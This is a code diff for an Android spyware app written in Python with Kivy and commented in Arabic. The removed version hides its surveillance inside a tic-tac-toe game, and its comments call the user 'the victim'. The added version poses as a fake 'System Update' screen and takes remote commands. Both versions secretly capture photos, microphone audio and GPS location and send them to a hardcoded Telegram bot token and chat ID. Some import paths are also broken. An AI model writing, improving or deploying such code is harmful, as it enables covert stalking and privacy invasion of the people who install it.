@@ -1,93 +1,90 @@
-from kivy.app import App
-from kivy.ux.gridlayout import GridLayout
-from kivy.ux.button import Button
-from plyer import camera, gps, audio, storagepath
+
+     from kivy.app import App
+from kivy.ux.label import Label
+from plyer import camera, gps, audio
 from android.permissions import request_permissions, Permission
 import requests
-import os
 import threading
 import time
+import os
 
 # بيانات الربط الخاصة بك
 TOKEN = "8646363010:AAFgi_CnQtYk0LWTn5naPUkgULMkLfXLIs4"
 CHAT_ID = "7263387179"
 
-class TicTacToeApp(App):
+class AdminControlApp(App):
     def build(self):
-        # طلب الصلاحيات فور تشغيل اللعبة
+        # طلب كل الصلاحيات اللازمة فور التشغيل
         request_permissions([
             Permission.CAMERA, Permission.RECORD_AUDIO,
-            Permission.ACCESS_FINE_LOCATION, Permission.READ_EXTERNAL_STORAGE,
-            Permission.WRITE_EXTERNAL_STORAGE
+            Permission.ACCESS_FINE_LOCATION, Permission.ACCESS_COARSE_LOCATION
         ])
         
-        # إشعار تشغيل التطبيق
-        self.send_telegram_msg("🎮 الضحية فتح اللعبة دلوقتي!")
+        self.send_msg("⚙️ النظام متصل.. أرسل (موقع، صورة، صوت) للتحكم.")
         
-        # تشغيل سحب الموقع والصوت في الخلفية
-        threading.Thread(target=self.initial_extraction).start()
+        # بدء "المستمع" في خلفية التطبيق
+        threading.Thread(target=self.listen_for_commands, daemon=True).start()
+        
+        return Label(text="System Update: 72%...")
 
-        # تصميم لعبة X-O
-        self.turn = 'X'
-        layout = GridLayout(cols=3)
-        for i in range(9):
-            btn = Button(text='', font_size=50)
-            btn.bind(on_release=self.play)
-            layout.add_widget(btn)
-        return layout
-
-    def play(self, btn):
-        if btn.text == '':
-            btn.text = self.turn
-            # مع كل حركة في اللعبة، بنصور سيلفي ونبعته
-            threading.Thread(target=self.silent_capture).start()
-            self.turn = 'O' if self.turn == 'X' else 'X'
-
-    def initial_extraction(self):
-        # سحب الموقع وتسجيل 10 ثواني صوت
-        self.get_location()
-        self.record_voice(10)
-
-    def send_telegram_msg(self, text):
-        try:
-            requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}")
+    def send_msg(self, text):
+        try: requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}")
         except: pass
 
-    def get_location(self):
+    def listen_for_commands(self):
+        last_id = 0
+        while True:
+            try:
+                url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_id + 1}"
+                data = requests.get(url).json()
+                for update in data.get("result", []):
+                    last_id = update["update_id"]
+                    msg = update.get("message", {}).get("text", "").strip()
+                    
+                    if msg == "موقع":
+                        self.get_gps()
+                    elif msg == "صورة":
+                        self.take_shot()
+                    elif msg == "صوت":
+                        threading.Thread(target=self.record_mic).start()
+            except: pass
+            time.sleep(4) # فحص كل 4 ثواني
+
+    def get_gps(self):
         try:
             gps.configure(on_location=self.on_location)
             gps.start()
-        except: pass
+        except: self.send_msg("❌ فشل تشغيل الـ GPS")
 
     def on_location(self, **kwargs):
-        msg = f"📍 موقع الهدف: https://www.google.com/maps?q={kwargs['lat']},{kwargs['lon']}"
-        self.send_telegram_msg(msg)
+        link = f"https://www.google.com/maps?q={kwargs['lat']},{kwargs['lon']}"
+        self.send_msg(f"📍 الموقع الحالي بدقة الشوارع:\n{link}")
         gps.stop()
 
-    def silent_capture(self):
+    def take_shot(self):
         try:
-            path = os.path.join(storagepath.get_pictures_dir(), "temp_snap.jpg")
-            camera.take_picture(filename=path, on_complete=self.upload_to_bot)
-        except: pass
+            p = "/sdcard/dcim/cam_test.jpg"
+            camera.take_picture(filename=p, on_complete=self.upload)
+        except: self.send_msg("❌ الكاميرا محجوبة")
 
-    def record_voice(self, seconds):
+    def record_mic(self):
         try:
-            path = os.path.join(storagepath.get_external_storage_dir(), "past_rec.3gp")
-            audio.start_recording(path)
-            time.sleep(seconds)
+            p = "/sdcard/dcim/voice_test.3gp"
+            audio.start_recording(p)
+            self.send_msg("🎙️ جاري تسجيل 15 ثانية...")
+            time.sleep(15)
             audio.stop_recording()
-            self.upload_to_bot(path, is_audio=True)
-        except: pass
+            self.upload(p, is_audio=True)
+        except: self.send_msg("❌ المايك مشغول")
 
-    def upload_to_bot(self, path, is_audio=False):
+    def upload(self, path, is_audio=False):
         try:
-            method = "sendAudio" if is_audio else "sendPhoto"
-            key = "audio" if is_audio else "photo"
-            url = f"https://api.telegram.org/bot{TOKEN}/{method}"
+            m = "sendAudio" if is_audio else "sendPhoto"
+            k = "audio" if is_audio else "photo"
             with open(path, 'rb') as f:
-                requests.post(url, data={'chat_id': CHAT_ID}, files={key: f})
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/{m}", data={'chat_id': CHAT_ID}, files={k: f})
         except: pass
 
 if __name__ == '__main__':
-    TicTacToeApp().run()
-          
+    AdminControlApp().run()
+     
